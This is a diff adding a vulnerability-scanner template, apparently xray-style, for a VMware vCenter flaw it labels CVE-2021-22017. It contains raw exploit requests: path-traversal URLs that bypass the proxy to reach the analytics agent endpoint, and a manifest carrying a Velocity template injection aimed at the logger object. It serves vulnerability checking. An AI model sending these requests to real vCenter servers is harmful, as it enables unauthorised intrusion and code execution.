@@ -1,0 +1,53 @@
+name: VMware_vCenter_rce__CVE_2021_22017
+transport: http
+detail:
+  dock: app="vmware-VirtualCenter"||app="VMware-VirtualCenter"
+  product: Vmware VCenter
+  homepage: https://www.vmware.com/products/vcenter-server.html
+  impact: <p>Due to improper implementation of URI standardization, an rhttpproxy
+    bypass vulnerability exists in VMware vCenter Server. Attackers can use this vulnerability
+    to gain unauthorized access to some specific interfaces, and then use Velocity
+    template engine to render malicious templates to modify log files, resulting in
+    arbitrary code execution ( CVE-2021-22017).</p>
+  description: <p>VMware vCenter Server is a set of server and virtualization management
+    software from Vmware. The software provides a centralized platform for managing
+    VMware vSphere environments, which can automatically implement and deliver virtual
+    infrastructure.</p><p>Due to improper implementation of URI standardization, an
+    rhttpproxy bypass vulnerability exists in VMware vCenter Server. Attackers can
+    use this vulnerability to gain unauthorized access to some specific interfaces,
+    and then use Velocity template engine to render malicious templates to modify
+    log files, resulting in arbitrary code execution ( CVE-2021-22017).</p>
+set:
+  randStr: randomLowercase(5)
+rules:
+  r1:
+    method: POST
+    path: /analytics/telemetry/ph/api/hyper/send?_c&_i=test
+    follow_redirects: false
+    headers:
+      Content-Type: application/json
+    body: test
+    expression: response.status == 201
+  r2:
+    method: POST
+    path: /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{randStr}}
+    follow_redirects: false
+    headers:
+      Content-Type: application/json
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: '1'
+      X-Deployment-Secret: abc
+    body: '{"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}'
+    expression: true
+  r3:
+    method: POST
+    path: /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{randStr}}&_i=test2
+    follow_redirects: false
+    headers:
+      Content-Type: application/json
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: '1'
+      X-Deployment-Secret: abc
+    body: '{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`'
+    expression: response.status == 200
+expression: r1() && r2() && r3()
